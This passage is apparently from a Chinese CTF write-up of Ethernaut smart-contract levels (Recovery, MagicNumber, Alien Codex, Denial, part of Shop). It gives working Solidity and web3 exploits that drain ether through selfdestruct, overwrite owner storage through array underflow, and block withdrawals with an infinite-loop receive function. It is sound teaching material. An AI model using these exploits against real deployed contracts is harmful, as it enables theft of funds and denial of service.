class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对solidity开发人员来说，丢失一个新创建的合约地址是常见的错误。这让人不爽特别是如果还丢失来交易收据和其他追溯步骤的方法。</p>
<p>这里有两个通过分别通过原始发送人信息和Etherscan找回合约地址的方法</p>
<p><strong>方法一：计算合约地址</strong></p>
<p>合约地址是确定计算的。黄皮书中</p>
<blockquote>
<p>新账户的地址被定义为只包含发送人和账户nonce的结构的RLP编码的keccak hash的最有160位。</p>
</blockquote>
<p>可以被下面函数表示<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))</span><br></pre></td></tr></table></figure></p>
<p>其中：</p>
<ul>
<li><code>sender address</code>：创建新合约的合约或钱包地址</li>
<li><code>nonce</code>：从<code>sender address</code>发送的交易数量。或者，如果sender是工厂合约，<code>nonce</code>是该账户创建的合约数量</li>
<li><code>RLP</code>：数据结构上的编码器，是以太坊中默认序列化对象</li>
<li><code>keccak</code>：一个加密原语，计算任意输入的Ethereum-SHA-3（Keccak-256）哈希</li>
</ul>
<blockquote>
<p>nonce 0总是智能合约自己的创建事件。第一个创建的合约nonce应该是1。</p>
</blockquote>
<p>根据<a target="_blank" rel="noopener" href="https://github.com/ethereum/wiki/wiki/RLP">文档</a>，20字节地址的RLP编码是<code>0xd6、0x94</code>。同时对所有小于<code>0x7f</code>的整数，它的编码正好是它自己的字节值。所以1的RLP就是<code>0x01</code></p>
<p>Remix中，计算如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address public a = address(keccak256(0xd6, 0x94, YOUR_ADDR, 0x01));</span><br></pre></td></tr></table></figure></p>
<p>要计算后续的合约地址只需要增加<code>nonce</code></p>
<p><strong>方法二：使用Etherscan</strong></p>
<p>从创建者获取新合约地址的一种更快的方法是使用Etherscan</p>
<p>根据当前地址查找合约，在<code>Internal Txns</code>选项里可以找到</p>
<p>回到题目，首先可以在console里获得当前instance的地址，根据上面提到的两种方法均可以得到。注意到合约中有函数<code>destroy</code>，内部调用了<code>selfdestruct()</code>自毁，会将余额转入指定的账户，可以通过这个函数获得其中的ether。</p>
<p>下面是直接通过ethersacn找到合约地址的方法，可以看到交易记录</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vxpbZV"><img src="https://s1.ax1x.com/2022/09/14/vxpbZV.png" alt="vxpbZV.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vxpqaT"><img src="https://s1.ax1x.com/2022/09/14/vxpqaT.png" alt="vxpqaT.png"></a></p>
<p>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address payable me = 0x862570693111DB350a6376c095B7E57c7650E78d;</span><br><span class="line">    SimpleToken s = SimpleToken(0x91d9d680c30B599B9A4f3535a6064AD474b325BC);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        s.destroy(me);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在remix通过计算得到地址的exp如下，注意上面知识中写的计算式的语法是旧版的，在题目<code>0.6.0</code>下有一点变化。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address payable me = 0x862570693111DB350a6376c095B7E57c7650E78d;</span><br><span class="line">    address payable public contract_addr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0x578a2025015482D56e3b35e2CB0d7b8AA4A56c84), bytes1(0x01))))));</span><br><span class="line">    SimpleToken s = SimpleToken(contract_addr);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        s.destroy(me);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>也可以直接使用web3计算<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(<span class="string">&#x27;0xd6&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, instance, <span class="string">&#x27;0x01&#x27;</span>).<span class="title function_">slice</span>(<span class="number">26</span>,)</span><br><span class="line"><span class="string">&#x27;4840b0ff01c598b4fc71576053079e28a594f5cb&#x27;</span></span><br><span class="line"></span><br><span class="line">data = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionCall</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;destroy&#x27;</span>, <span class="attr">type</span>:<span class="string">&#x27;function&#x27;</span>, <span class="attr">inputs</span>:[&#123;<span class="attr">type</span>:<span class="string">&#x27;address&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;_to&#x27;</span>&#125;]&#125;,[player]);</span><br><span class="line"><span class="string">&#x27;0x00f55d9d000000000000000000000000862570693111db350a6376c095b7e57c7650e78d&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">to</span>:<span class="string">&quot;0x4840b0ff01c598b4fc71576053079e28a594f5cb&quot;</span>, <span class="attr">from</span>:player, <span class="attr">data</span>:data&#125;)</span><br></pre></td></tr></table></figure></p>
<h1 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目要求：需要提供一个合约Solver，用正确的数字（42）回应<code>whatIsTheMeaningOfLife()</code>。同时限制最多10 opcodes</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/x9m1s0"><img src="https://s1.ax1x.com/2022/09/19/x9m1s0.png" alt="x9m1s0.png"></a></p>
<p>合约初始化的过程中，发生下面这些事：</p>
<ol>
<li>首先，用户或合约发送一笔交易到以太坊网络。这笔交易包含数据，但是没有收件地址。这种格式向EVM表明这是合约创建，而不是常规的发送/调用交易</li>
<li>其次，EVM把合约代码（高级的，人类可读的语言）编译成字节码（低级的，机器可读的语言）。字节码直接翻译成操作码在调用栈中执行</li>
</ol>
<blockquote>
<p>注意：合约创建字节码包括 1) 初始化代码 2) 合约实际运行的代码，按顺序连接</p>
</blockquote>
<ol>
<li>在合约创建期间，EVM只执行初始化代码（initial code），直到它在栈中碰到<code>STOP</code>或<code>RETURN</code>指令为止。在此阶段，将运行合约的<code>constructor()</code>函数，并且合约有一个地址</li>
<li>在初始化代码运行之后，只有运行代码（runtime code）保留在栈上。然后这些操作码将被复制到内存并返回给EVM</li>
<li>最后，EVM将返回的剩余代码和新的合约地址一起存储在状态存储中。这是运行代码（runtime code），未来所有对该新合约的调用都会执行该代码</li>
</ol>
<p>回到题目，想要解决该题需要两套opcode：</p>
<ul>
<li><code>Initialization opcodes</code>：直接被EVM运行来创建合约并存储未来的runtime opcodes</li>
<li><code>Runtime opcdes</code>： 包含实际运行逻辑。这是代码的主体部分，应该返回<code>0x42</code>并在10 opcodes以内</li>
</ul>
<p>更细致的学习链接（备忘）：<br><a target="_blank" rel="noopener" href="https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2">https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2</a><br><a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/">https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/</a></p>
<p>先看<code>runtime opcodes</code></p>
<p>返回值被<code>RETURN</code>操作码控制，需要两个参数</p>
<ul>
<li><code>p</code>：内存中存储的值的位置</li>
<li><code>s</code>：存储数据的大小</li>
</ul>
<p>由上说明在返回之前还要先将值存储到内存中，使用<code>mstore（p, v）</code>存储，其中p是位置，v是十六进制值</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">602</span>a <span class="regexp">//</span> v: push1 <span class="number">0</span>x2a (value <span class="number">42</span>)</span><br><span class="line"><span class="number">6080</span> <span class="regexp">//</span> p: push1 <span class="number">0</span>x80 (memeory slot)</span><br><span class="line"><span class="number">52</span> <span class="regexp">//m</span>store</span><br><span class="line"><span class="number">6020</span> <span class="regexp">//</span> s: push1 <span class="number">0</span>x20 (value is <span class="number">32</span>bytes <span class="keyword">in</span> size)</span><br><span class="line"><span class="number">6080</span> <span class="regexp">//</span> p: push1 <span class="number">0</span>x80 (value was stored <span class="keyword">in</span> slot <span class="number">0</span>x80)</span><br><span class="line">f3 <span class="regexp">//</span> return</span><br></pre></td></tr></table></figure>
<p>即<code>602a60805260206080f3</code></p>
<p>再看<code>initialization opcodes</code>。这些opcodes需要在将runtime opcodes返回到EVM前复制到它们内存中。EVM会自动保存runtime序列<code>602a60805260206080f3</code>到区块链</p>
<p><code>codecopy</code>是一个用来将code从一个地方复制到另一个地方的opcode，需要三个参数</p>
<ul>
<li><code>t</code>：code在内存中的目的地</li>
<li><code>f</code>：<code>runtime opcodes</code>相对所有字节码目前的位置。记住<code>f</code>从<code>initialization opcodes</code>结束后开始。现在还不知道这个值</li>
<li><code>s</code>：code的大小，以字节为单位。<code>602a60805260206080f3</code>0x0a字节长</li>
</ul>
<p>首先将<code>runtime opcodes</code>复制到内存中，然后为<code>f</code>添加一个占位符，因为目前未知。然后将内存中的<code>runtime opcodes</code>返回给EVM</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">600</span>a <span class="regexp">//</span> s: push1 <span class="number">0</span>x0a (<span class="number">10</span> bytes)</span><br><span class="line"><span class="number">60</span>?? <span class="regexp">//</span> f: push1 <span class="number">0</span>x?? (current position of runtime opcodes)</span><br><span class="line"><span class="number">6000</span> <span class="regexp">//</span> t: push1 <span class="number">0</span>x00 (destination memory index <span class="number">0</span>)</span><br><span class="line"><span class="number">39</span> <span class="regexp">//</span> CODECOPY</span><br><span class="line"><span class="number">600</span>a <span class="regexp">//</span> s: push1 <span class="number">0</span>x0a (runtime opcode length)</span><br><span class="line"><span class="number">6000</span> <span class="regexp">//</span> p: push1 <span class="number">0</span>x00 (access memory index <span class="number">0</span>)</span><br><span class="line">f3 <span class="regexp">//</span> return to EVM</span><br></pre></td></tr></table></figure>
<p>注意到<code>initialization opcodes</code>占据12字节，所以<code>runtime opcodes</code>会从index 0x0c处开始，所以上面<code>codecopy</code>中参数<code>f</code>为0x0c</p>
<p>最后的序列如下<br><code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>
<p>使用web3发送，最后调用<code>setSolver</code>传入新合约的地址</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytecodes = <span class="string">&#x27;0x600a600c600039600a6000f3602a60805260206080f3&#x27;</span>;</span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">data</span>:bytecodes&#125;, <span class="keyword">function</span>(<span class="params">err, res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(res)&#125;);</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;contract address&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>还有一种opcode的思路是<code>initialization opcodes</code>使用<code>mstore</code>存储<code>runtime opcodes</code>并返回<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">69602</span>a60005260206000f3 <span class="regexp">//</span> value: push10 <span class="number">602</span>a60005260206000f3</span><br><span class="line"><span class="number">6000</span>  <span class="regexp">//</span> offset: push <span class="number">00</span></span><br><span class="line"><span class="number">52</span> <span class="regexp">//</span> mstore</span><br><span class="line"><span class="number">600</span>a <span class="regexp">//</span> size: PUSH <span class="number">0</span>x0a</span><br><span class="line"><span class="number">6016</span> <span class="regexp">//</span> offset: PUSH <span class="number">0</span>x16</span><br><span class="line">f3 <span class="regexp">//</span> return</span><br></pre></td></tr></table></figure></p>
<p>这里一开始不是很理解为啥<code>return</code>时对应的偏移为0x16</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor () public payable &#123;</span><br><span class="line">     assembly&#123;</span><br><span class="line">       mstore(0, 0x602a60005260206000f3)</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>debug一下，确实是0x16的偏移</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xP3QVs"><img src="https://s1.ax1x.com/2022/09/20/xP3QVs.png" alt="xP3QVs.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xP3lan"><img src="https://s1.ax1x.com/2022/09/20/xP3lan.png" alt="xP3lan.png"></a></p>
<p>因为长度是10，一个slot 32bytes，从后往前放，所以相对开头的index对应偏移为32-10=22=0x16</p>
<h1 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回忆一下数组array是如何存储的</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">-----------------------------------------------------</span></span><br><span class="line"><span class="code">|                      a (32)                       | &lt;- slot 0</span></span><br><span class="line"><span class="code">-----------------------------------------------------</span></span><br><span class="line"><span class="section">|                    b.length (32)                  | &lt;- slot 1</span></span><br><span class="line"><span class="section">-----------------------------------------------------</span></span><br><span class="line"><span class="section">|                      c (32)                       | &lt;- slot 2</span></span><br><span class="line"><span class="section">-----------------------------------------------------</span></span><br><span class="line"><span class="section">|                        ...                        |   ......</span></span><br><span class="line"><span class="section">-----------------------------------------------------</span></span><br><span class="line">|                      b[0] (32)                    | &lt;- slot <span class="code">`keccak256(1)`</span></span><br><span class="line"><span class="code">-----------------------------------------------------</span></span><br><span class="line"><span class="code">|                      b[1] (32)                    | &lt;- slot `keccak256(1) + 1`</span></span><br><span class="line"><span class="code">-----------------------------------------------------</span></span><br><span class="line"><span class="section">|                        ...                        |   ......</span></span><br><span class="line"><span class="section">-----------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>动态数组的存储规则是在对应slot存储数组长度，数组元素存储在<code>keccak256(idx)</code>对应slot</p>
<p>查看当前数组长度，发现为0</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>看到函数都需要通过一个<code>contact</code>为<code>true</code>的一个断言，可以直接调用<code>make_contact</code>实现。<br>接着调用一次<code>retract</code>，数组长度发生负溢</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">contact</span>()</span><br><span class="line">contract.<span class="title function_">retract</span>()</span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#x27;</span></span><br></pre></td></tr></table></figure>
<p>接着考虑修改<code>owner</code>的值，在slot0中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272&#x27;</span></span><br></pre></td></tr></table></figure>
<p>数组元素存储位置的计算方法为<code>keccak256(1)+index</code>，而总容量为$ 2^{256} $，当<code>index = 2**256-keccak256(1)</code>时，上式发生上溢为0，则将指向slot0，再利用函数<code>revuse</code>即可对<code>owner</code>进行覆盖</p>
<p>使用remix编译并攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">  AlienCodex a = AlienCodex(0x98326c52f149b4c0b7cf84D4020D6972A2D170dA);</span><br><span class="line">  bytes32 public ct  = bytes32(0x000000000000000000000000862570693111DB350a6376c095B7E57c7650E78d);</span><br><span class="line">  uint public idx  = uint256(2)**uint256(256)-uint256(keccak256(abi.encodePacked(uint256(1))));</span><br><span class="line">  function exp() public &#123;</span><br><span class="line">    a.revise(idx, ct);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x000000000000000000000000862570693111db350a6376c095b7e57c7650e78d&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner = address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend = address(this).balance.div(100);</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题意就是要拒绝题目合约中<code>withdraw</code>发给我们的以太币，已知收到以太币时会调用<code>fallback</code>或<code>receive</code>函数。<code>call()</code>函数会随着调用转发所有gas，而<code>transfer()</code>和<code>send()</code>只转发 2300 gas</p>
<p><code>call()</code>返回两个值，一个<code>bool success</code>表示call执行成功和一个包含返回值的<code>byets memeory data</code>。注意外部调用(external call)的返回值不在任何地方进行检查</p>
<p>完成题目要阻止<code>owner.transfer(amountToSend)</code>被调用，可以创建一个合约通过里面的<code>fallback</code>或<code>receive</code>函数耗尽gas来阻止继续执行其他指令。</p>
<blockquote>
<p>A contract can have at most one receive function, declared using receive() external payable { … } (without the function keyword). This function cannot have arguments, cannot return anything and must have external visibility and payable state mutability. It can be virtual, can override and can have modifiers.</p>
<p>The receive function is executed on a call to the contract with empty calldata. This is the function that is executed on plain Ether transfers (e.g. via .send() or .transfer()). If no such function exists, but a payable fallback function exists, the fallback function will be called on a plain Ether transfer. If neither a receive Ether nor a payable fallback function is present, the contract cannot receive Ether through regular transactions and throws an exception.</p>
</blockquote>
<p>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">  Denial d = Denial(0x884b2F4aFDa9EB789108F170B722999bb63c74E9);</span><br><span class="line"></span><br><span class="line">  constructor () public &#123;</span><br><span class="line">    d.setWithdrawPartner(address(this));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    while(true) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目要求低于price来获得商品<br>并提示注意<code>view</code>修饰符的限制</p>
<blockquote>
<p>Functions can be declared view in which case they promise not to modify the state.</p>
